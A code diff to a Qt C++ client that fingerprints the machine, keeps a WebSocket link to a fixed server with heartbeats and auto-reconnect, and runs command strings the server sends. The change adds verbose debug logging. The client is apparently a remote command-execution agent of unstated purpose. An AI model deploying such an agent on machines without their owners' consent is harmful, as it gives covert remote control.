@@ -25,25 +25,32 @@
 MainWindow::MainWindow(QWidget *parent)
     : QMainWindow(parent), m_isRegistered(false)
 {
+    qDebug() << "==========================================";
+    qDebug() << "🚀 QT CLIENT STARTING UP!";
+    qDebug() << "==========================================";
+    
     // Generate or load machine fingerprint
     m_machineFingerprint = getOrCreateMachineFingerprint();
+    qDebug() << "Machine Fingerprint:" << m_machineFingerprint;
     
     // Generate unique UUID for this client
     m_clientUuid = generateUuid();
+    qDebug() << "Client UUID:" << m_clientUuid;
     
     // Create heartbeat timer
     m_heartbeatTimer = new QTimer(this);
     connect(m_heartbeatTimer, &QTimer::timeout, this, &MainWindow::onHeartbeatTimer);
+    qDebug() << "💓 Heartbeat timer created";
     
     // Setup WebSocket connections
     connect(&m_webSocket, &QWebSocket::connected, this, &MainWindow::onConnected);
     connect(&m_webSocket, &QWebSocket::textMessageReceived, this, &MainWindow::onMessageReceived);
     connect(&m_webSocket, &QWebSocket::disconnected, this, &MainWindow::onDisconnected);
     connect(&m_webSocket, &QWebSocket::errorOccurred, this, &MainWindow::onError);
+    qDebug() << "🔌 WebSocket signals connected";
 
-    qDebug() << "Machine Fingerprint:" << m_machineFingerprint;
-    qDebug() << "Client UUID:" << m_clientUuid;
-    qDebug() << "Connecting to:" << DEF_WS_URL.toString();
+    qDebug() << "🌐 Connecting to:" << DEF_WS_URL.toString();
+    qDebug() << "==========================================";
     
     m_webSocket.open(DEF_WS_URL);
 }
@@ -274,7 +281,10 @@ void MainWindow::sendCapabilityReport()
 
 void MainWindow::sendHeartbeat()
 {
-    if (!m_isRegistered) return;
+    if (!m_isRegistered) {
+        qDebug() << "💓 Heartbeat skipped - not registered";
+        return;
+    }
     
     QJsonObject json;
     json["type"] = "heartbeat";
@@ -284,22 +294,35 @@ void MainWindow::sendHeartbeat()
     QJsonDocument doc(json);
     m_webSocket.sendTextMessage(doc.toJson(QJsonDocument::Compact));
     
-    qDebug() << "Heartbeat sent";
+    qDebug() << "💓 Heartbeat sent - Client UUID:" << m_clientUuid;
 }
 
 void MainWindow::onConnected()
 {
-    qDebug() << "Connected to WebSocket server!";
+    qDebug() << "==========================================";
+    qDebug() << "✅ CONNECTED TO WEBSOCKET SERVER!";
+    qDebug() << "==========================================";
+    qDebug() << "WebSocket URL:" << DEF_WS_URL.toString();
+    qDebug() << "WebSocket Valid:" << m_webSocket.isValid();
+    qDebug() << "Client UUID:" << m_clientUuid;
+    qDebug() << "Machine Fingerprint:" << m_machineFingerprint;
+    qDebug() << "==========================================";
     
     if (m_webSocket.isValid()) {
         // Send registration immediately upon connection
+        qDebug() << "📤 Sending registration message...";
         sendRegistration();
+    } else {
+        qDebug() << "❌ WebSocket is not valid!";
     }
 }
 
 void MainWindow::onMessageReceived(const QString& strMessage)
 {
-    qDebug() << "Received message:" << strMessage;
+    qDebug() << "==========================================";
+    qDebug() << "📨 RECEIVED MESSAGE FROM SERVER:";
+    qDebug() << "==========================================";
+    qDebug() << "Raw message:" << strMessage;
     
     // Parse JSON message
     QJsonDocument doc = QJsonDocument::fromJson(strMessage.toUtf8());
@@ -313,16 +336,22 @@ void MainWindow::onMessageReceived(const QString& strMessage)
     
     // Handle registration success
     if (type == "register_success") {
-        qDebug() << "Registration successful!";
+        qDebug() << "==========================================";
+        qDebug() << "🎉 REGISTRATION SUCCESSFUL!";
+        qDebug() << "==========================================";
+        qDebug() << "Client UUID:" << m_clientUuid;
+        qDebug() << "Status: REGISTERED";
         m_isRegistered = true;
         
         // Start heartbeat timer (send every 30 seconds)
         m_heartbeatTimer->start(30000);
+        qDebug() << "💓 Heartbeat timer started (30 seconds)";
         
         // Don't send capability report - server doesn't recognize this message type
         // sendCapabilityReport();
         
-        qDebug() << "Client is now fully registered and sending heartbeats";
+        qDebug() << "✅ Client is now fully registered and sending heartbeats";
+        qDebug() << "==========================================";
         return;
     }
     
@@ -344,7 +373,12 @@ void MainWindow::onMessageReceived(const QString& strMessage)
         QString cmd = json["cmd"].toString();
         QString taskId = json["taskId"].toString();
         
-        qDebug() << "Received command:" << cmd << "Task ID:" << taskId;
+        qDebug() << "==========================================";
+        qDebug() << "🎯 RECEIVED COMMAND FROM SERVER!";
+        qDebug() << "==========================================";
+        qDebug() << "Command:" << cmd;
+        qDebug() << "Task ID:" << taskId;
+        qDebug() << "==========================================";
         
         if (cmd == "execute") {
             QString command = json["command"].toString();
@@ -396,7 +430,12 @@ void MainWindow::onMessageReceived(const QString& strMessage)
 
 void MainWindow::executeCommand(const QString& command, const QString& taskId)
 {
-    qDebug() << "Executing command:" << command;
+    qDebug() << "==========================================";
+    qDebug() << "⚡ EXECUTING COMMAND!";
+    qDebug() << "==========================================";
+    qDebug() << "Command:" << command;
+    qDebug() << "Task ID:" << taskId;
+    qDebug() << "==========================================";
     
     if (command.isEmpty()) {
         sendErrorResponse(taskId, "Empty command received");
@@ -502,28 +541,42 @@ void MainWindow::sendErrorResponse(const QString& taskId, const QString& errorMe
 
 void MainWindow::onDisconnected()
 {
-    qDebug() << "Disconnected from server";
+    qDebug() << "==========================================";
+    qDebug() << "❌ DISCONNECTED FROM SERVER!";
+    qDebug() << "==========================================";
+    qDebug() << "Client UUID:" << m_clientUuid;
+    qDebug() << "Status: DISCONNECTED";
     m_isRegistered = false;
     
     // Stop heartbeat timer
     if (m_heartbeatTimer) {
         m_heartbeatTimer->stop();
+        qDebug() << "💓 Heartbeat timer stopped";
     }
     
     // Try to reconnect after 5 seconds
     QTimer::singleShot(5000, this, [this]() {
-        qDebug() << "Attempting to reconnect...";
+        qDebug() << "🔄 Attempting to reconnect in 5 seconds...";
+        qDebug() << "WebSocket URL:" << DEF_WS_URL.toString();
         m_webSocket.open(DEF_WS_URL);
     });
+    qDebug() << "==========================================";
 }
 
 void MainWindow::onError(QAbstractSocket::SocketError socketError)
 {
-    qWarning() << "WebSocket error:" << socketError << m_webSocket.errorString();
+    qDebug() << "==========================================";
+    qDebug() << "❌ WEBSOCKET ERROR!";
+    qDebug() << "==========================================";
+    qDebug() << "Error Code:" << socketError;
+    qDebug() << "Error String:" << m_webSocket.errorString();
+    qDebug() << "Client UUID:" << m_clientUuid;
+    qDebug() << "==========================================";
     
     // Try to reconnect after 10 seconds on error
     QTimer::singleShot(10000, this, [this]() {
-        qDebug() << "Attempting to reconnect after error...";
+        qDebug() << "🔄 Attempting to reconnect after error in 10 seconds...";
+        qDebug() << "WebSocket URL:" << DEF_WS_URL.toString();
         m_webSocket.open(DEF_WS_URL);
     });
 }
